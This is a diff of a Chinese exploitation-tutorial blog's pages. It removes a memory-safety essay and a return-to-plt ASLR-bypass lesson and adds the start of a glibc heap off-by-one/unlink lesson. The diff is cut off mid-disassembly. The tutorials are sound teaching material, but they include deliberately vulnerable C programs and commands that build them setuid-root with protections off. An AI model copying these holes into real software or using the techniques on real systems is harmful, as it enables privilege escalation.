-<p>这里，缓冲区溢出发生在 <em>object</em> 的内部。我们仍然可以类似的在域间引入无限间距的概念来排除缓冲区溢出的错误。这并未太背离现实，C标准允许编译器决定不同域的间距。另一方面，程序语言把结构体当做一个单独的<em>object</em> (从 <em>malloc</em> 返回的单独指针). 许多程序会把一个结构体映射到另一个结构体，或者会确定好一种间距方案。许多编译器都支持这些操作，但是否可以有一种更好的定义不依赖于这些？</p>
-<h3 id="Pointers-as-capabilities"><a href="#Pointers-as-capabilities" class="headerlink" title="Pointers as capabilities"></a>Pointers as capabilities</h3><p>从 <em>Definition 2</em> 中，了解到许多概念，比如，定义的（分配的），未定义的（从没有分配的或者分配后回收的),我们假设分配后回收的内存不会再复用。如此一来，只要访问未定义的内存，就会违背内存安全性。</p>
-<p><strong><em>Definition 3:</em></strong> 我们引入这么一个概念, Pointers as capabilities. 也就是说，允许指针的持有者访问一定区域中的内存。一个指针由三个元素组成<em>（p,b,e)</em>: <em>b</em> 定义有效的区域，<em>e</em> 定义边界，<em>p</em> 代表指针本身。 程序只能操作<em>p</em>，<em>b</em> 和<em>e</em> ,这样做只是为了定义一次执行是否是内存安全的。</p>
-<p>举个例子，看下面的<em>Program 3</em>以及对应的内存效果图：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">/* Program 3 */</div><div class="line">struct foo &#123;</div><div class="line">  int x;</div><div class="line">  int y;</div><div class="line">  char *pc;</div><div class="line">&#125;;</div><div class="line">struct foo *pf = malloc(...);</div><div class="line">pf-&gt;x = 5;</div><div class="line">pf-&gt;y = 256;</div><div class="line">pf-&gt;pc = &quot;before&quot;;</div><div class="line">pf-&gt;pc += 3;</div><div class="line">int *px = &amp;pf-&gt;x;</div></pre></td></tr></table></figure>
-<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/memory-safety3.jpg" alt="memory-safety3"></p>
-<p>重点关注代码的最后两行。<em>Program 3</em> 允许指针运算来新建一个新的指针，但只能当新指针落在b到e之间才能被解引用。从代码中看到，增加 <em>\</em>pc<em>的</em>p<em> ,新指针仍然落在</em>b<em> 和</em>e<em> 之间，所以执行</em>*(pf-&gt;pc)<em> 是合法有效的。但如果执行 </em>pf-&gt;pc+=10<em> , </em>*(pf-&gt;pc)<em> 将会违背内存安全性，尽管</em>pf-&gt;pc<em> 有可能碰巧就落在定义的内存区域中（这块内存区域可能分配给了其它</em>object*).</p>
-<p>最后一行代码创建一个新的指针<em>px</em> 指向<em>pf</em> 指针的第一个域，将边界缩小到其中的一个域中。这就排除了 <em>Program 2</em> 带来的内存溢出问题。加入我们保留<em>pf</em>整个的边界，此程序可能会利用<em>px</em>溢出到结构体中的其它域中。</p>
-<p>Capability是无法伪造的，就像我们并不能伪造一个指针映射到整形数据中。非法映射可以是直接的（<em>e.g. p=(int \</em>)5<em> ） 也可以是间接的，比如将含有整形数据的结构体映射到含有指针的结构体中（</em>e.g. p=(int **)pf<em> ), 将</em>Program 3<em> 中结构体中的第一个整形数据域映射成指针。我们的定义简单的将映射看作是空操作。只有有效的指针才能被解引用，一个指针的capabilities在它创建的时候就已经确定了。 我们的定义中允许 </em>Program 4* 的执行：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/* Program 4 */</div><div class="line">int x;</div><div class="line">int *p = &amp;x;</div><div class="line">int y = (int)p;</div><div class="line">int *q = (int *)y</div><div class="line">*q = 5;</div></pre></td></tr></table></figure>
-<p><em>p</em> 指针初始化得<em>b</em> 和<em>e</em> 一直会保持不变，尽管之后<em>p</em> 被转化成整形y, 因此当<em>y</em> 被转回为<em>q</em> 并被解引用的时候，指针依然存在。从另一方面来看，如果在<em>Program 3</em> 的最后加上 <em>p=(int \</em>*)pf<em> , 紧接着 </em>*p=malloc(sizeof(int))<em>， 之后的操作 </em>**p<em>以及</em>printf(“%d\n”,pf-&gt;x)* 都是合法的。也就是说，一块内存区域一开始存储了整形数据，之后也可将整形数据修改为指向整形数据的指针，然后解引用指针，这样操作是安全的，但反过来却不行。</p>
-<p>在某种意义上来说，基于capability定义的内存安全性是一种类型安全形式（type safety)。这里只有两种类型：指针类型和非指针类型。这种定义保证了 1) 指针只在定义了合法内存区域的安全模式下被创建. 2) 指针只有在它们是指向分配给它们的内存区域的情况下被解引用. 3) 那块内存区域仍然是定义过的。这种定义排除了上述所有的五种错误。</p>
-<p>注：本文主要意译 PL Enthusiast 上的一篇文章： <a href="http://www.pl-enthusiast.net/2014/07/21/memory-safety/" target="_blank" rel="external">What is memory safety</a> </p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.pl-enthusiast.net/2014/07/21/memory-safety/" target="_blank" rel="external">What is memory safety</a><br><a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a></p>
-<p>作者[@diting0x] 于2016年2月17日Lawson computer science building &amp;&amp; The lodge apartment</p>
-<p>另，感谢<a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a><br>的作者 <a href="https://nebelwelt.net" target="_blank" rel="external">Mathis Payer教授</a> 的某些答疑，感谢感谢好友 <a href="http://www.yebangyu.org/" target="_blank" rel="external">叶邦宇</a> 指出的一些勘误。</p>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety" target="_blank" rel="external">内存持久战之内存安全性</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/内存安全/">内存安全<span class="article-category-count">3</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-bypassaslr-returntoplt"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/bypassaslr-returntoplt/">绕过ASLR-第一篇章(return-to-plt)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170101/bypassaslr-returntoplt/" class="article-date">
-	  <time datetime="2017-01-01T03:40:21.000Z" itemprop="datePublished">一月 1, 2017</time>
+	Posted on <a href="/20170104/heap-offbyone/" class="article-date">
+	  <time datetime="2017-01-04T14:35:27.000Z" itemprop="datePublished">一月 4, 2017</time>
 	</a>
 
     </div>
@@ -469,83 +131,87 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
       
         <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
 <hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第一篇章(return-to-plt)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，本系列所有文章涉及的源码可以在<a href="https://github.com/sploitfun/lsploits" target="_blank" rel="external">这里</a>找到。CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/heap-offbyone" target="_blank" rel="external">Linux(X86)漏洞利用系列-Unlink堆溢出)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
 <hr>
 <blockquote>
 <ul>
-<li>0x01 ASLR</li>
-<li>0x02 Return-to-plt</li>
-<li>0x03 调用‘function@PLT’</li>
+<li>0X01 什么是off-by-one漏洞</li>
+<li>0X02 如何做到任意代码执行</li>
+<li>0X03 为什么不是prev_size的最小影响字节(LSB)被覆盖</li>
+<li>0X04 覆盖tls_dtor_list</li>
+<li>0X05 为什么没能获取root shell</li>
 </ul>
 </blockquote>
-<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
-<p>在前面的文章中，为了利用漏洞代码，攻击者需要知道：</p>
+<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">栈内off-by-one漏洞</a><br>    <a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">深入理解glibc malloc</a></p>
+<p><u>VM Setup</u>: Fedora 20(x86)</p>
+<h3 id="0X01-什么是off-by-one漏洞"><a href="#0X01-什么是off-by-one漏洞" class="headerlink" title="0X01 什么是off-by-one漏洞"></a>0X01 什么是off-by-one漏洞</h3><p>在<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">这篇</a>文中说过，当将源字符串拷贝到目的字符串时出现下述情况可能会发生off-by-one</p>
 <ul>
-<li>栈地址（为了跳转到shellcode中)</li>
-<li>libc基地址(为了成功绕过NX)</li>
+<li>源字符串长度等于目的字符串长度</li>
 </ul>
-<p>因此，为了防御攻击者的行为，安全研究人员提出一种漏洞利用缓解(exploit mitigation)方法: “ASLR”</p>
-<h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>地址空间布局随机化(ASLR)是一种漏洞利用缓解方法，其可以随机化</p>
+<p>当源字符串长度等于目的字符串长度时，单个NULL字节会被拷贝到目的字符串中。这里由于目的字符串处于堆中，单个NULL字节可以覆盖下一个chunk的头部信息,从而导致任意代码执行。</p>
+<p><u>扼要重述</u>：在<a href="http://www.csyssec.org/20170104/glibcmalloc/" target="_blank" rel="external">这篇</a>文中说过，堆根据每个用户对堆内存的请求，被分为多个chunk.每个chunk有自己的chunk头部信息(由<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1108" target="_blank" rel="external">malloc_chunk</a>表示)。 结构体malloc_chunk含有以下四个域：</p>
 <ul>
-<li>栈地址</li>
-<li>堆地址</li>
-<li>共享库地址</li>
+<li>1.prev_size - 若前一个chunk空闲，则prev_size域包含前一个chunk的大小信息；若前一个chunk已经被分配，则这个域包含前一个chunk的用户数据</li>
+<li>2.size: size域含有这个已经分配的chunk。域的后3比特含有flag信息。<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1267" target="_blank" rel="external">PREV_INUSE(P)</a>- 当前一个chunk被分配时，此位被设置</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1274" target="_blank" rel="external">IS_MMAPPED(M)</a>- 当chunk被mmap了，此位被设置。</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1283" target="_blank" rel="external">NON_MAIN_ARENA(N)</a>- 当这个chunk属于一个线程arena时，此位被设置。</li>
 </ul>
-<p>上述地址一旦被随机化，尤其是当共享库地址被随机化时，由于攻击者需要知道libc的基地址，我们前面提到的绕过NX的方法不再有效。但这种缓解技术也不是完全安全的。</p>
-<p>从<a href="">前文</a>中，我们已经知道exp.py中的 libc函数地址是以下面计算方式得到的：</p>
-<pre><code>libc函数地址=libc基地址+函数偏移
-</code></pre><p>这里</p>
-<ul>
-<li>由于随机化被关闭，libc基地址是个常量(在‘vuln’二进制文件中是0xb7e22000)</li>
-<li>函数偏移也是常量(可以执行”readelf -s libc.so.6 | grep”获取)</li>
+</li>
+<li>3.fd- 指向同一个bin中的下一个chunk</li>
+<li>4.bk- 指向同一个bin中的前一个chunk</li>
 </ul>
-<p>现在当我们利用以下命令打开全随机化选项时(full randomization)</p>
-<pre><code>#echo 2 &gt; /proc/sys/kernel/randomize_va_space
-</code></pre><p>libc基地址将会被随机化</p>
-<p><u>注意</u>： 只有libc的基地址被随机化了，从基地址开始的一个特殊函数的偏移仍然是个常量！因此，尽管打开了ASLR,只要我们能利用下面三项技术绕过共享库基地址的随机化，漏洞程序仍然能被成功利用.</p>
-<ul>
-<li>Return-to-plt（<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">这篇文章</a>）</li>
-<li>暴力破解(<a href="http://www.csyssec.org/20170101/bypassaslr-bruteforce" target="_blank" rel="external">第二篇章</a>)</li>
-<li>GOT覆盖与GOR解引用(<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇章</a>)</li>
-</ul>
-<h3 id="Return-to-plt"><a href="#Return-to-plt" class="headerlink" title="Return-to-plt"></a>Return-to-plt</h3><p>利用这项技术，攻击者返回到一个函数的PLT(其地址没有被随机化-在执行之前就可以知道)，而不是返回到libc函数(其地址被随机化了)。 由于’function@PLT’没有被随机化，攻击者不需要预测libc的基地址，而只要简单地返回到‘function@PLT’就可以调用这个’function’。</p>
-<pre><code>什么是PLT,如何调用‘function@PLT&apos;来调用其中的&apos;function&apos;
-</code></pre><h3 id="调用‘function-PLT’"><a href="#调用‘function-PLT’" class="headerlink" title="调用‘function@PLT’"></a>调用‘function@PLT’</h3><p>要了解过程链接表（Procedural Linkage Table(PLT)）,先来简单介绍一下共享库！</p>
-<p>不同于静态库的是，共享库的text段在多个进程间共享，但它的数据段在每个进程中是唯一的。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC!</p>
-<pre><code>什么是PIC呢？
-</code></pre><p>位置独立代码(Position Independent Code(PIC))用来解决这个问题： 尽管共享库的text段在加载期间执行重定为，也能确保它能在多个进程中共享。PIC通过一层间接寻址来达到这个目的。共享库的text段中没有绝对虚拟地址来替代全局描述符和函数引用，而是指向数据段中的一个特定表。这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
-<p>动态链接器使用下面两种方法来重定位PIC中的全局描述符和函数：</p>
-<ul>
-<li><u>全局偏移表(Global Offset Table(GOT))</u>: 全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符.</li>
-<li><u>过程链接表(Procedural Linkage Table(PLT)): 过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。存根代码在动态链接器的帮助下，解析函数地址并将其拷贝到GOT(GOT[n])中。解析过程只发生在第一次调用函数(‘function’)的时候,之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址</u></li>
-</ul>
-<p>很高兴你知道了PIC并能理解它能保证共享库的text段的完整性，因此能帮助共享库的text段再许多进程间共享！ 但你是否怀疑过，为什么可执行文件的text段并不在任何进程间共享，也需要有个GOT表项或者PLT存根代码呢？这是出于安全保护机制的考虑。如今默认情况下，text段只提供读和执行权限并没有写权限(R_X)。这种保护机制并允许动态链接库对text段进行写操作，因此也就不能重定位text段内部的数据描述符或函数地址。为了让动态链接器能重定位，可执行文件同共享库一样也需要GOT表项和PLT存根代码。</p>
-<p><u>代码样例</u>：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//eg.c</span></div><div class="line"><span class="comment">//$gcc -g -o eg eg.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, argv[<span class="number">1</span>]);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>下面的汇编代码说明了’printf’并不是直接被调用，而是其相应的PLT代码 ‘printf@PLT’被调用了。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x080483e4</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x080483e5</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x080483e7</span> &lt;+<span class="number">3</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp</div><div class="line"> <span class="number">0x080483ea</span> &lt;+<span class="number">6</span>&gt;: sub $<span class="number">0x10</span>,%esp</div><div class="line"> <span class="number">0x080483ed</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax</div><div class="line"> <span class="number">0x080483f0</span> &lt;+<span class="number">12</span>&gt;: add $<span class="number">0x4</span>,%eax</div><div class="line"> <span class="number">0x080483f3</span> &lt;+<span class="number">15</span>&gt;: mov (%eax),%edx</div><div class="line"> <span class="number">0x080483f5</span> &lt;+<span class="number">17</span>&gt;: mov $<span class="number">0x80484e0</span>,%eax</div><div class="line"> <span class="number">0x080483fa</span> &lt;+<span class="number">22</span>&gt;: mov %edx,<span class="number">0x4</span>(%esp)</div><div class="line"> <span class="number">0x080483fe</span> &lt;+<span class="number">26</span>&gt;: mov %eax,(%esp)</div><div class="line"> <span class="number">0x08048401</span> &lt;+<span class="number">29</span>&gt;: call <span class="number">0x8048300</span> &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line"> <span class="number">0x08048406</span> &lt;+<span class="number">34</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x0804840b</span> &lt;+<span class="number">39</span>&gt;: leave </div><div class="line"> <span class="number">0x0804840c</span> &lt;+<span class="number">40</span>&gt;: ret </div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble <span class="number">0x8048300</span></div><div class="line">Dump of assembler code <span class="keyword">for</span> function <span class="built_in">printf</span>@plt:</div><div class="line"> <span class="number">0x08048300</span> &lt;+<span class="number">0</span>&gt;: jmp *<span class="number">0x804a000</span></div><div class="line"> <span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"> <span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>在’printf’第一次被调用前，其相应的GOT表项(0x804a000)指回到PLT代码(0x8048306)本身。因此，当printf函数第一次被调用时，其相应的函数地址通过动态链接器来解析。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0x08048306</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>现在printf被调用之后，其相应的GOT表项含有printf的函数地址(如下图):</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0xb7e6e850</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p><u>注意 1</u>: 如果你想了解PLT和GOT的更多信息，可以阅读<a href="">这篇</a>文章</p>
-<p><u>注意 2</u>: 我会在别的文中单独谈谈动态链接器是如何解析libc函数地址的。现在只要记住下面两条语句(printf@PLT的一部分）是用来解析函数地址的！</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"><span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div></pre></td></tr></table></figure>
-<p>了解这个之后，我们可以知道攻击者并不需要知道libc函数的地址来调用libc函数，只要简单通过’function@PLT’（在执行前知道）就可以调用了。</p>
 <p><u>漏洞代码</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</div><div class="line"> system(<span class="string">"/bin/sh"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//consolidate_forward.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 16</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line"> <span class="keyword">int</span> fd = open(<span class="string">"./inp_file"</span>, O_RDONLY); <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"File open error\n"</span>);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">1020</span>) &#123; <span class="comment">/* [2] */</span></div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Buffer Overflow Attempt. Exiting...\n"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">-2</span>);</div><div class="line"> &#125;</div><div class="line"></div><div class="line"> <span class="keyword">char</span>* tmp = <span class="built_in">malloc</span>(<span class="number">20</span><span class="number">-4</span>); <span class="comment">/* [3] */</span></div><div class="line"> <span class="keyword">char</span>* p = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [4] */</span></div><div class="line"> <span class="keyword">char</span>* p2 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [5] */</span></div><div class="line"> <span class="keyword">char</span>* p3 = <span class="built_in">malloc</span>(<span class="number">1024</span><span class="number">-4</span>); <span class="comment">/* [6] */</span></div><div class="line"></div><div class="line"> read(fd,tmp,SIZE); <span class="comment">/* [7] */</span></div><div class="line"> <span class="built_in">strcpy</span>(p2,argv[<span class="number">1</span>]); <span class="comment">/* [8] */</span></div><div class="line"></div><div class="line"> <span class="built_in">free</span>(p); <span class="comment">/* [9] */</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p><u>编译命令</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p>现在反汇编可执行文件’vuln’,我们可以找出’system@PLT’与’exit@PLT’的地址</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble shell</div><div class="line">Dump of assembler code <span class="keyword">for</span> function shell:</div><div class="line"> <span class="number">0x08048474</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x18</span>,%esp</div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">6</span>&gt;: movl $<span 